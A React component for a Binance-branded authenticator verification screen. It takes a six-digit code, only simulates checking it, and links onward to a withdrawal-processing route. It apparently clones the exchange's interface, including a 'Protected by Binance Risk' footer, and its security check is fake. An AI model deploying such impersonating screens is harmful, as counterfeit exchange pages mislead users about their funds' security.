import { useState, useRef, useEffect } from 'react';
import { Shield } from 'lucide-react';
import { Link } from 'react-router-dom';
import  arrow from '../assets/arrow.jpg'
export default function AuthenticatorVerification() {
  const [code, setCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const inputRef = useRef(null);

  // Focus input on component mount
  useEffect(() => {
    if (inputRef.current) {
      inputRef.current.focus();
    }
  }, []);

  const handleChange = (e) => {
    const value = e.target.value;
    // Only allow numbers and limit to 6 digits
    if (/^\d*$/.test(value) && value.length <= 6) {
      setCode(value);
    }
  };

  const handleSubmit = () => {
    if (code.length === 6) {
      setIsLoading(true);
      // Simulate verification process
      setTimeout(() => {
        setIsLoading(false);
      }, 1500);
    }
  };

  const handlePaste = () => {
    navigator.clipboard.readText()
      .then(text => {
        // Filter only numbers and limit to 6 digits
        const numericText = text.replace(/[^0-9]/g, '').slice(0, 6);
        setCode(numericText);
      })
      .catch(err => {
        console.error('Failed to read clipboard: ', err);
      });
  };

  return (
    <div className="flex flex-col h-screen color text-white">
      {/* Header */}
      <div className="p-4 flex justify-between items-center">
      <img src={arrow} alt=""width={30} />
        <button className="text-white">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M18 6L6 18" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
            <path d="M6 6L18 18" stroke="white" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
          </svg>
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex flex-col p-6">
        <div className="mb-6">
          <h1 className="text-3xl font-bold mb-2">Authenticator App Verification</h1>
          <p className="text-gray-400 text-[14px]">
            Enter the 6-digit code generated by the Authenticator App.
          </p>
        </div>

        <div className="mt-2">
          <label className="block text-gray-400 mb-2 text-[14px] ">Authenticator App</label>
          <div className="relative">
            <input
              ref={inputRef}
              type="text"
              inputMode="numeric"
              value={code}
              onChange={handleChange}
              className="w-full bg-gray-700 text-white p-4 rounded-lg focus:outline-none "
            //   placeholder="Enter 6-digit code"
            />
            <button 
              onClick={handlePaste}
              className="absolute right-4 top-1/2 transform -translate-y-1/2 text-yellow-400 font-medium"
            >
              Paste
            </button>
          </div>
        </div>
  <Link to={'/withdrawalProcessing'}
   disabled={code.length !== 6 || isLoading}
  >
        <button 
          onClick={handleSubmit}
          disabled={code.length !== 6 || isLoading}
          className={`w-full py-4 mt-6 rounded-lg font-medium btn-2 fromValue`}
            >
          {isLoading ? 'Verifying...' : 'Submit'}
        </button>
    </Link>

        <div className="mt-6 space-y-4">
          <button className="w-full text-left text-color text-[14px]">
            Use Passkeys to Complete Verification
          </button>
          <button className="w-full text-left text-color text-[14px]">
            Switch to Another Verification Method
          </button>
          <button className="w-full text-left text-color text-[14px]">
            Security verification unavailable?
          </button>
        </div>
      </div>

      {/* Footer */}
      <div className="p-6 flex justify-center items-center">
        <Shield className="w-5 h-5 text-gray-400 mr-2" />
        <span className="text-gray-400 text-[14px]">Protected by Binance Risk</span>
      </div>
    </div>
  );
}